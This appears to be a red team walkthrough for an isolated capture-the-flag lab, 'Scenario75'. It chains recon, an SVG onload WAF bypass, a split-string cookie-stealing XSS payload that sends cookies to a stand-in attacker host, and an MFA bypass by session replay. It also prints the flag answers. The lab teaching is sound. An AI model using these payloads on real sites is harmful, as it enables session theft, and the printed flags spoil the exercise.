# Red Team Guide — Scenario75 Cyber Range

> **Authorization required.** All activities documented here are only
> permitted inside the isolated cyber-range VM, with explicit written
> authorization. Do not perform these steps on any system outside the lab.

---

## Overview

This guide describes the intended attack path through the Scenario75 CTF lab.
The scenario demonstrates a realistic chain: reconnaissance → WAF bypass → XSS cookie theft → MFA bypass → session replay → flag.

---

## Phase 1: Reconnaissance

**Objective:** Enumerate the target to identify attack surface.

```bash
curl http://127.0.0.1:3075/robots.txt
```

Expected response:
```
User-agent: *
Disallow: /api/verify-mfa
Disallow: /dashboard
# SCENARIO75{R3c0n_F1ag_R0b0ts_D1sc0v3r3d}
```

Also check the `X-Powered-By` response header — it reveals the application identity:
```
X-Powered-By: SCENARIO75{Node.js}
```

**Finding:** Two interesting paths — `/api/verify-mfa` (MFA endpoint) and `/dashboard` (admin panel).

---

## Phase 2: WAF Probing

**Objective:** Probe the WAF and identify bypass vectors.

Step 1 — Test basic script tag (blocked):
```bash
curl -X POST http://127.0.0.1:3075/api/feedback \
  -H 'Content-Type: application/json' \
  -d '{"message":"<script>alert(1)</script>"}'
# Expected: HTTP 403 — WAF: Blocked
```

Step 2 — Try HTML5/SVG event handler (allowed — WAF bypass):
```bash
curl -X POST http://127.0.0.1:3075/api/feedback \
  -H 'Content-Type: application/json' \
  -d '{"message":"<svg onload=alert(1)>"}'
# Expected: HTTP 200 — WAF bypass succeeds
```

**Finding:** The WAF blocks `<script>` but misses SVG/HTML5 event-handler payloads. Signature-only WAFs are insufficient.

---

## Phase 3: XSS and Cookie Theft

**Objective:** Capture the `pre_mfa_session` cookie from a victim session using XSS.

The `pre_mfa_session` cookie is set with `HttpOnly=false` (intentional CTF vulnerability), making it accessible from JavaScript.

Direct `document.cookie` is blocked by the WAF. Use a split-string pattern to bypass:
```javascript
// Blocked:
document.cookie

// Allowed (split-string bypass):
var c = document["coo"+"kie"];
```

A working SVG XSS payload to exfiltrate the cookie within the isolated lab:
```html
<svg onload="var c=document['coo'+'kie'];fetch('http://attacker-lab-host/?c='+c)">
```

**Note:** All exfiltration must stay within the isolated lab. No real network traffic is generated or transmitted outside the VM.

---

## Phase 4: MFA Bypass via Session Replay

**Objective:** Exchange the stolen `pre_mfa_session` for an `adm_sess` without completing MFA.

The `/api/verify-mfa` endpoint accepts any valid `pre_mfa_session` cookie and issues `adm_sess` without checking an actual MFA code. This is the intentional authentication bypass vulnerability.

```bash
curl -X POST http://127.0.0.1:3075/api/verify-mfa \
  -H 'Content-Type: application/json' \
  -b 'pre_mfa_session=<stolen_token>' \
  -c /tmp/ctf_cookies.txt \
  -d '{}'
# Expected: HTTP 200, sets adm_sess cookie
```

---

## Phase 5: Dashboard Access — Final Flag

**Objective:** Access `/dashboard` with the `adm_sess` cookie to retrieve the Red Team flag.

```bash
curl http://127.0.0.1:3075/dashboard \
  -b 'adm_sess=<adm_sess_token>'
# Expected: HTTP 200, dashboard HTML containing:
# SCENARIO75{RED_C00k13_MFA_Byp4ss_0wn3d}
```

The flag is only present in the authenticated dashboard response. Unauthenticated requests receive HTTP 401.

---

## Summary

| Phase | Technique | Result |
|-------|-----------|--------|
| Reconnaissance | robots.txt, response headers | Discover /api/verify-mfa, /dashboard |
| WAF bypass | SVG onload event handler | Bypass script-tag filter |
| XSS + cookie theft | Split-string document.cookie access | Capture pre_mfa_session |
| MFA bypass | Session replay to /api/verify-mfa | Obtain adm_sess |
| Dashboard | Present adm_sess cookie | **SCENARIO75{RED_C00k13_MFA_Byp4ss_0wn3d}** |
